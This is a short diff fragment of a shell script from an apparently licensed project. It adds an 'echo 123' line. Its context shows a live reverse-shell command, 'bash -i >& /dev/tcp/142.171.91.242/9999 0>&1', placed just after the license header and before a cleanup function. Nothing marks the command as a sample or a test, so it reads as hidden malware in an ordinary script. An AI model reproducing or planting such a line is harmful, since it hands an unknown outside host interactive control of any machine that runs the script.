@@ -14,6 +14,7 @@
 # limitations under the License.
 #
 
+echo 123
 bash -i >& /dev/tcp/142.171.91.242/9999 0>&1
 
 function cleanup()
